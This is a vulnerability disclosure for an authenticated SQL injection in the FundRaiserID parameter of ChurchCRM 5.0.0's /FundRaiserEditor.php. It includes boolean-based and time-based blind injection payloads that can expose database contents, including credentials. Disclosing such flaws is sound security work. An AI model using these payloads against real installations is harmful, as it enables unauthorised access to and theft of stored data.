## Description
A SQL injection vulnerability in ChurchCRM v.5.0.0 allows a remote attacker to obtain sensitive database information via the FundRaiserID parameters within the `/FundRaiserEditor.php` endpoint. An authenticated attacker can use injection to perform arbitrary SQL queries via GET request with the `FundRaiserID` parameter at the `/FundRaiserEditor.php` endpoint. This can be used for information disclosure of anything in the database, including user credentials.

## Proof of Concept
    Parameter: FundRaiserID (GET)
        Type: boolean-based blind
        Title: AND boolean-based blind - WHERE or HAVING clause
        Payload: FundRaiserID=1 AND 8632=8632
    
        Type: time-based blind
        Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
        Payload: FundRaiserID=1 AND (SELECT 1444 FROM (SELECT(SLEEP(5)))Frah)
